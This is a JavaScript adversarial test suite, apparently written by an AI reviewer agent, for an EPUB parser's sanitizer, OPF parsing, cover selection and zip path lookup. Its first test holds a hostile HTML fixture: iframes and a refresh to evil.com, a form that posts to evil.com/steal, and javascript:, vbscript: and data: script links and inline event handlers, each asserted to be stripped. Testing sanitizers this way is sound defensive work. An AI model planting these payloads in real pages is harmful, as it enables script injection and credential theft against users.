/**
 * .agents/teamwork/m2_r2_reviewer_1/adversarial_suite.js
 * Independent Adversarial Stress Test & Integrity Verification Suite
 * Milestone 2 Iteration 2 (Remediation Review) - Reviewer 1
 */

const fs = require('node:fs');
const path = require('node:path');
const puppeteer = require('puppeteer-core');
const { startServer } = require('../../../test/server.js');
const { buildAllFixtures } = require('../../../test/test-fixtures/generate-fixtures.js');

const CHROME_PATH = process.env.CHROME_BIN || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
const PROJECT_ROOT = path.resolve(__dirname, '../../..');

async function runAdversarialSuite() {
  console.log('====================================================================');
  console.log('   Milestone 2 Iteration 2 Reviewer 1 Adversarial Suite             ');
  console.log('====================================================================');

  buildAllFixtures();

  const { url: serverUrl, close: closeServer } = await startServer({ port: 0, autoPortFallback: true });
  console.log(`[reviewer-1] Server listening on ${serverUrl}`);

  const browser = await puppeteer.launch({
    executablePath: CHROME_PATH,
    headless: 'new',
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const page = await browser.newPage();

  page.on('console', msg => {
    if (msg.type() === 'error') {
      console.log(`[browser-error] ${msg.text()}`);
    }
  });

  let allPassed = true;

  try {
    await page.goto(`${serverUrl}/index.html`, { waitUntil: 'domcontentloaded' });

    const results = await page.evaluate(async () => {
      const suiteResults = [];

      function assert(cond, msg) {
        if (!cond) throw new Error(msg);
      }

      const { PathResolver, findZipEntry } = await import('/js/parser/path-resolver.js');
      const { OpfParser, isImageItem, getNodeLocalName, findElementByLocal, findElementsByLocal, getMetaText } = await import('/js/parser/opf-parser.js');
      const { TocParser } = await import('/js/parser/toc-parser.js');
      const { AssetExtractor, DOMSanitizer } = await import('/js/parser/asset-extractor.js');
      const { EpubParser } = await import('/js/parser/epub-parser.js');

      // -----------------------------------------------------------------
      // TEST 1: Adversarial DOMSanitizer Security Stress
      // -----------------------------------------------------------------
      try {
        const parser = new DOMParser();
        const hostileHtml = `
          <!DOCTYPE html>
          <html>
            <head>
              <meta http-equiv="refresh" content="0; url=https://evil.com">
              <base href="https://evil.com/assets/">
              <title>Hostile Document</title>
            </head>
            <body>
              <div id="wrapper">
                <p>Nested frame test:</p>
                <div>
                  <iframe src="https://evil.com/phishing"></iframe>
                  <frame src="evil_frame.html"></frame>
                  <frameset><frame src="inner.html"></frameset>
                  <object data="malicious.swf"></object>
                  <embed src="malicious.pdf"></embed>
                  <applet code="Evil.class"></applet>
                </div>
                <form action="https://evil.com/steal" method="POST" target="_top">
                  <input type="text" name="data" value="secret">
                  <button type="submit" formaction="https://evil.com/override" formmethod="POST" formtarget="_blank">Submit</button>
                  <input type="submit" formaction="https://evil.com/inoverride">
                </form>
                <a href="  javascript:/*comment*/alert(1)  " id="link-js">Click me</a>
                <a href="vbscript:msgbox(1)" id="link-vb">Click me</a>
                <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" id="link-data-html">Data HTML</a>
                <a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" id="link-safe-data">Safe Data</a>
                <div id="handlers"
                     ONCLICK="alert(1)"
                     onmouseover="alert(2)"
                     onAnimationEnd="alert(3)"
                     onerror="alert(4)">
                  Content
                </div>
                <svg>
                  <image xlink:href="javascript:alert(5)" id="svg-img"/>
                  <image href="safe.png" id="svg-safe"/>
                </svg>
              </div>
            </body>
          </html>
        `;

        const doc = parser.parseFromString(hostileHtml, 'text/html');
        DOMSanitizer.sanitize(doc);

        // Assert 0 dangerous tags
        const remainingDangerous = doc.querySelectorAll('iframe, frame, frameset, object, embed, applet, base, meta[http-equiv="refresh" i]');
        assert(remainingDangerous.length === 0, `Expected 0 dangerous elements, found ${remainingDangerous.length}`);

        // Assert form neutralized
        const form = doc.querySelector('form');
        assert(form !== null, 'Form element should not be destroyed, only neutralized');
        assert(!form.hasAttribute('action'), 'Form action attribute should be removed');
        assert(!form.hasAttribute('method'), 'Form method attribute should be removed');
        assert(!form.hasAttribute('target'), 'Form target attribute should be removed');
        assert(!form.hasAttribute('onsubmit'), 'Form should not have onsubmit');

        const button = doc.querySelector('button');
        assert(!button.hasAttribute('formaction'), 'Button formaction should be removed');
        assert(!button.hasAttribute('formmethod'), 'Button formmethod should be removed');
        assert(!button.hasAttribute('formtarget'), 'Button formtarget should be removed');

        const inputSubmit = doc.querySelector('input[type="submit"]');
        assert(!inputSubmit.hasAttribute('formaction'), 'Input formaction should be removed');

        // Assert dangerous schemes stripped
        const linkJs = doc.querySelector('#link-js');
        assert(!linkJs.hasAttribute('href'), 'javascript: href should be stripped');
        const linkVb = doc.querySelector('#link-vb');
        assert(!linkVb.hasAttribute('href'), 'vbscript: href should be stripped');
        const linkDataHtml = doc.querySelector('#link-data-html');
        assert(!linkDataHtml.hasAttribute('href'), 'data:text/html href should be stripped');

        // Assert safe data URI preserved
        const safeData = doc.querySelector('#link-safe-data');
        assert(safeData.hasAttribute('href'), 'Safe data:image/png should be preserved');

        // Assert all on* attributes stripped
        const handlersEl = doc.querySelector('#handlers');
        assert(!handlersEl.hasAttribute('onclick'), 'onclick should be stripped');
        assert(!handlersEl.hasAttribute('ONCLICK'), 'ONCLICK should be stripped');
        assert(!handlersEl.hasAttribute('onmouseover'), 'onmouseover should be stripped');
        assert(!handlersEl.hasAttribute('onanimationend'), 'onAnimationEnd should be stripped');
        assert(!handlersEl.hasAttribute('onerror'), 'onerror should be stripped');

        // Assert SVG dangerous xlink:href stripped, safe preserved
        const svgImg = doc.querySelector('#svg-img');
        assert(!svgImg.hasAttribute('xlink:href'), 'SVG javascript xlink:href should be stripped');
        const svgSafe = doc.querySelector('#svg-safe');
        assert(svgSafe.getAttribute('href') === 'safe.png', 'SVG safe href should be preserved');

        // Assert zero inline on* anywhere in doc
        const allElements = doc.querySelectorAll('*');
        for (let i = 0; i < allElements.length; i++) {
          const attrs = Array.from(allElements[i].attributes);
          for (let j = 0; j < attrs.length; j++) {
            assert(!attrs[j].name.toLowerCase().startsWith('on'), `Found residual on* attribute: ${attrs[j].name}`);
          }
        }

        suiteResults.push({ name: 'DOMSanitizer Hostile Stress & Form Neutralization', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'DOMSanitizer Hostile Stress & Form Neutralization', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // TEST 2: OpfParser HTML5 Fallback & Prefix Splitting Resilience
      // -----------------------------------------------------------------
      try {
        // Intentionally create malformed XML with unescaped bare '<' inside text to trigger parsererror and HTML5 fallback
        const malformedOpfXml = `
          <package version="2.0" unique-identifier="book-id">
            <metadata>
              <dc:title>Mathematical Analysis: When x < y & y > z</dc:title>
              <dc:creator>Leonhard Euler</dc:creator>
              <dc:creator>Carl Friedrich Gauss</dc:creator>
              <dc:language>la</dc:language>
              <dc:identifier id="book-id">urn:uuid:math-1234</dc:identifier>
              <meta name="cover" content="item-cover-jpg" />
            </metadata>
            <manifest>
              <item id="item-cover-jpg" href="images/cover%20art.jpg" media-type="image/jpeg" />
              <item id="c1" href="text/ch01.xhtml" media-type="application/xhtml+xml" />
              <item id="c2" href="text/ch02.xhtml" media-type="application/xhtml+xml" />
              <item id="c3" href="text/ch03.xhtml" media-type="application/xhtml+xml" />
              <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml" />
            </manifest>
            <spine toc="ncx">
              <itemref idref="c1" linear="yes" />
              <itemref idref="c2" linear="yes" />
              <itemref idref="c3" linear="no" />
            </spine>
          </package>
        `;

        const parsed = OpfParser.parseOpf(malformedOpfXml, 'OEBPS/content.opf');

        assert(parsed.metadata.title.includes('Mathematical Analysis'), `Title extraction failed: "${parsed.metadata.title}"`);
        assert(parsed.metadata.author === 'Leonhard Euler, Carl Friedrich Gauss', `Multiple authors failed: "${parsed.metadata.author}"`);
        assert(parsed.metadata.language === 'la', `Language failed: "${parsed.metadata.language}"`);
        assert(parsed.metadata.identifier === 'urn:uuid:math-1234', `Identifier failed: "${parsed.metadata.identifier}"`);

        // Check manifest size: must find all 5 items despite self-closing nesting in HTML5
        assert(parsed.manifest.size === 5, `Expected 5 manifest items in HTML5 fallback mode, got ${parsed.manifest.size}`);
        assert(parsed.manifest.has('item-cover-jpg'), 'Missing item-cover-jpg');
        assert(parsed.manifest.has('c1'), 'Missing c1');
        assert(parsed.manifest.has('c2'), 'Missing c2');
        assert(parsed.manifest.has('c3'), 'Missing c3');
        assert(parsed.manifest.has('ncx'), 'Missing ncx');

        // Check spine items: must find all 3 items
        assert(parsed.spine.length === 3, `Expected 3 spine items in HTML5 fallback mode, got ${parsed.spine.length}`);
        assert(parsed.spine[0].idref === 'c1' && parsed.spine[0].isLinear === true, 'Spine 0 mismatch');
        assert(parsed.spine[1].idref === 'c2' && parsed.spine[1].isLinear === true, 'Spine 1 mismatch');
        assert(parsed.spine[2].idref === 'c3' && parsed.spine[2].isLinear === false, 'Spine 2 linear="no" mismatch');

        // Check cover item resolved via meta cover
        assert(parsed.coverItem !== null, 'Cover item should be resolved');
        assert(parsed.coverItem.id === 'item-cover-jpg', 'Cover item id mismatch');

        suiteResults.push({ name: 'OpfParser HTML5 Fallback & Prefix Splitting Resilience', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'OpfParser HTML5 Fallback & Prefix Splitting Resilience', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // TEST 3: 4-Step Cover Cascade Priority and Non-Image Rejection
      // -----------------------------------------------------------------
      try {
        // Construct OPF with all 4 steps present simultaneously:
        // Step 1 candidate (EPUB 3 properties="cover-image"): if non-image, must skip to Step 2!
        const cascadeXml = `
          <package xmlns="http://www.idpf.org/2007/opf" version="3.0">
            <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
              <dc:title>Cascade Test</dc:title>
              <meta name="cover" content="step2-image" />
            </metadata>
            <manifest>
              <item id="step1-fake" href="cover.html" media-type="application/xhtml+xml" properties="cover-image" />
              <item id="step2-image" href="images/meta-cover.jpg" media-type="image/jpeg" />
              <item id="cover-image" href="images/id-cover.png" media-type="image/png" />
              <item id="step4-candidate" href="images/my-book-cover.webp" media-type="image/webp" />
            </manifest>
            <spine>
              <itemref idref="step1-fake" />
            </spine>
          </package>
        `;

        const parsedCascade = OpfParser.parseOpf(cascadeXml, 'content.opf');
        assert(parsedCascade.coverItem !== null, 'Cover item should not be null');
        assert(parsedCascade.coverItem.id === 'step2-image', `Expected Step 2 cover (step2-image), got ${parsedCascade.coverItem.id}`);

        suiteResults.push({ name: '4-Step Cover Cascade Non-Image Rejection & Priority', passed: true });
      } catch (err) {
        suiteResults.push({ name: '4-Step Cover Cascade Non-Image Rejection & Priority', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // TEST 4: PathResolver.findZipEntry Archive Key Decoded Matching
      // -----------------------------------------------------------------
      try {
        const mockZip = {
          files: {
            'OEBPS/Images/Cover%20Photo%20(1).JPG': { name: 'OEBPS/Images/Cover%20Photo%20(1).JPG' },
            'OEBPS\\Text\\Ch%201.xhtml': { name: 'OEBPS\\Text\\Ch%201.xhtml' },
            './OEBPS/Styles/main.css': { name: './OEBPS/Styles/main.css' },
            '/OEBPS/fonts/font.woff2': { name: '/OEBPS/fonts/font.woff2' }
          },
          file(path) {
            return this.files[path] || null;
          }
        };

        // 1. Query with decoded path for percent-encoded zip entry
        const entry1 = findZipEntry(mockZip, 'OEBPS/Images/Cover Photo (1).JPG');
        assert(entry1 !== null, 'Failed finding percent-encoded ZIP key via decoded path');

        // 2. Query with lowercase decoded path
        const entry2 = findZipEntry(mockZip, 'oebps/images/cover photo (1).jpg');
        assert(entry2 !== null, 'Failed finding lowercase decoded path for percent-encoded key');

        // 3. Query with exact percent-encoded path
        const entry3 = findZipEntry(mockZip, 'OEBPS/Images/Cover%20Photo%20(1).JPG');
        assert(entry3 !== null, 'Failed finding exact percent-encoded path');

        // 4. Query Windows-backslash entry via forward slash normalized path
        const entry4 = findZipEntry(mockZip, 'OEBPS/Text/Ch 1.xhtml');
        assert(entry4 !== null, 'Failed finding Windows backslash key via forward slash path');

        // 5. Query leading-dot entry via normalized path
        const entry5 = findZipEntry(mockZip, 'OEBPS/Styles/main.css');
        assert(entry5 !== null, 'Failed finding leading-dot key via normalized path');

        // 6. Query leading-slash entry via normalized path
        const entry6 = findZipEntry(mockZip, 'OEBPS/fonts/font.woff2');
        assert(entry6 !== null, 'Failed finding leading-slash key via normalized path');

        // 7. Non-existent entry returns null
        const entryNonExistent = findZipEntry(mockZip, 'OEBPS/Images/does-not-exist.png');
        assert(entryNonExistent === null, 'Non-existent entry should return null');

        suiteResults.push({ name: 'PathResolver.findZipEntry Permutation & Decode Matching', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'PathResolver.findZipEntry Permutation & Decode Matching', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // TEST 5: Full ParsedEpub Interface Contract Conformance & Cleanup
      // -----------------------------------------------------------------
      try {
        const resp = await fetch('/test/test-fixtures/valid-sample.epub');
        assert(resp.ok, `Failed loading valid-sample.epub: ${resp.status}`);
        const buffer = await resp.arrayBuffer();

        const parsedEpub = await EpubParser.parse(buffer);

        // Verify PROJECT.md:88-99 ParsedEpub interface properties
        assert(typeof parsedEpub.metadata === 'object' && parsedEpub.metadata !== null, 'metadata must be object');
        assert(typeof parsedEpub.metadata.title === 'string', 'metadata.title must be string');
        assert(typeof parsedEpub.metadata.author === 'string', 'metadata.author must be string');

        assert(parsedEpub.coverBlobUrl === null || typeof parsedEpub.coverBlobUrl === 'string', 'coverBlobUrl must be string or null');

        assert(Array.isArray(parsedEpub.spine), 'spine must be array');
        for (let i = 0; i < parsedEpub.spine.length; i++) {
          const item = parsedEpub.spine[i];
          assert(typeof item.id === 'string', `spine[${i}].id must be string`);
          assert(typeof item.href === 'string', `spine[${i}].href must be string`);
          assert(typeof item.fullPath === 'string', `spine[${i}].fullPath must be string`);
          assert(typeof item.isLinear === 'boolean', `spine[${i}].isLinear must be boolean`);
        }

        assert(Array.isArray(parsedEpub.toc), 'toc must be array');
        function verifyTocItems(items) {
          for (let i = 0; i < items.length; i++) {
            const item = items[i];
            assert(typeof item.id === 'string', `toc[${i}].id must be string`);
            assert(typeof item.title === 'string', `toc[${i}].title must be string`);
            assert(typeof item.href === 'string', `toc[${i}].href must be string`);
            assert(typeof item.fullPath === 'string', `toc[${i}].fullPath must be string`);
            assert(typeof item.hash === 'string', `toc[${i}].hash must be string`);
            assert(Array.isArray(item.children), `toc[${i}].children must be array`);
            if (item.children.length > 0) {
              verifyTocItems(item.children);
            }
          }
        }
        verifyTocItems(parsedEpub.toc);

        assert(typeof parsedEpub.getChapterDocument === 'function', 'getChapterDocument must be function');
        assert(parsedEpub.assetMap instanceof Map, 'assetMap must be Map');
        assert(typeof parsedEpub.cleanup === 'function', 'cleanup must be function');

        // Test getChapterDocument
        const firstSpine = parsedEpub.spine[0];
        const doc = await parsedEpub.getChapterDocument(firstSpine.fullPath);
        assert(doc instanceof Document, 'getChapterDocument must return a Document');
        assert(doc.querySelector('h1, h2, p') !== null, 'Rendered document should contain content');

        // Test cleanup lifecycle
        let revokedCount = 0;
        const origRevoke = URL.revokeObjectURL;
        URL.revokeObjectURL = (url) => {
          revokedCount++;
          origRevoke.call(URL, url);
        };

        const totalBlobs = parsedEpub.assetMap.size + (parsedEpub.coverBlobUrl ? 1 : 0);
        parsedEpub.cleanup();

        URL.revokeObjectURL = origRevoke;

        assert(parsedEpub.assetMap.size === 0, 'assetMap should be empty after cleanup');

        // Calling getChapterDocument after cleanup must throw
        let threw = false;
        try {
          await parsedEpub.getChapterDocument(firstSpine.fullPath);
        } catch (_) {
          threw = true;
        }
        assert(threw, 'getChapterDocument after cleanup should throw an error');

        suiteResults.push({ name: 'ParsedEpub Interface Contract Conformance & Cleanup', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'ParsedEpub Interface Contract Conformance & Cleanup', passed: false, error: err.message });
      }

      // -----------------------------------------------------------------
      // TEST 6: Integrity & Non-Hardcoded Dynamic Parsing Verification
      // -----------------------------------------------------------------
      try {
        // Test with arbitrary dynamically constructed EPUB metadata to ensure parser isn't hardcoded to sample data
        const uniqueId = `book-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;
        const dynamicXml = `
          <package xmlns="http://www.idpf.org/2007/opf" version="3.0">
            <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
              <dc:title>Dynamic Unique Title ${uniqueId}</dc:title>
              <dc:creator>Dynamic Author ${uniqueId}</dc:creator>
              <dc:identifier>id-${uniqueId}</dc:identifier>
              <dc:language>fr</dc:language>
            </metadata>
            <manifest>
              <item id="c1" href="ch01.xhtml" media-type="application/xhtml+xml" />
            </manifest>
            <spine>
              <itemref idref="c1" />
            </spine>
          </package>
        `;

        const parsed = OpfParser.parseOpf(dynamicXml, 'OEBPS/package.opf');
        assert(parsed.metadata.title === `Dynamic Unique Title ${uniqueId}`, 'Dynamic title did not match exactly');
        assert(parsed.metadata.author === `Dynamic Author ${uniqueId}`, 'Dynamic author did not match exactly');
        assert(parsed.metadata.identifier === `id-${uniqueId}`, 'Dynamic identifier did not match exactly');
        assert(parsed.metadata.language === 'fr', 'Dynamic language did not match');

        suiteResults.push({ name: 'Integrity Check: Dynamic Unhardcoded OPF Parsing', passed: true });
      } catch (err) {
        suiteResults.push({ name: 'Integrity Check: Dynamic Unhardcoded OPF Parsing', passed: false, error: err.message });
      }

      return suiteResults;
    });

    for (const r of results) {
      if (r.passed) {
        console.log(`  ✅ PASS: ${r.name}`);
      } else {
        console.log(`  ❌ FAIL: ${r.name} - ${r.error}`);
        allPassed = false;
      }
    }

  } finally {
    await browser.close();
    closeServer();
  }

  console.log('====================================================================');
  if (allPassed) {
    console.log('ALL ADVERSARIAL STRESS TESTS PASSED!');
  } else {
    console.log('SOME ADVERSARIAL STRESS TESTS FAILED!');
    process.exit(1);
  }
}

runAdversarialSuite().catch(err => {
  console.error('[fatal]', err);
  process.exit(1);
});
